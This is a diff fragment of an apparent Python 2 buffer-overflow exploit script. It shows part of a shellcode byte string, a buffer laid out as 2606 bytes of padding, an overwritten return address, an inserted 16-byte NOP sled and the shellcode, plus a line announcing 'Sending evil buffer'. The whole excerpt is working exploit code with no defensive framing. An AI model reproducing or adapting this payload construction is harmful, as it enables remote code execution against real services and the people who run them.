@@ -30,7 +30,7 @@ shell = (
 "\xb9\x68\x41\x7e\x3a\x98\x3a\x85\x22\xe9\x3f\xc1\xe4\x02\x32"
 "\x5a\x81\x24\xe1\x5b\x80")
 
-buffer = 'A' * 2606 + '\x8F\x35\x4a\x5f' + shell + 'C' * (3500-2606-4-351)
+buffer = 'A' * 2606 + '\x8F\x35\x4a\x5f' + "\x90" * 16 + shell + 'C' * (3500-2606-4-351-16)
 
 try:
   print "\nSending evil buffer..." 
